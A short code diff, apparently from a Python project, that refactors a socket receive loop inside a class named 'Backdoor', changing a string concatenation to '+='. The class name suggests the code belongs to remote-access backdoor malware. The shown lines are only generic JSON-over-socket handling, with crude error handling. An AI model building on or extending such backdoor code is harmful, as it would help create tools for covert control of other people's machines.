@@ -42,7 +42,7 @@ class Backdoor:
       json_data = b""
       while True:
          try:
-            json_data = json_data + self.connection.recv(1024)
+            json_data += self.connection.recv(1024)
             return json.loads(json_data)
          except:
             return traceback.print_exc()
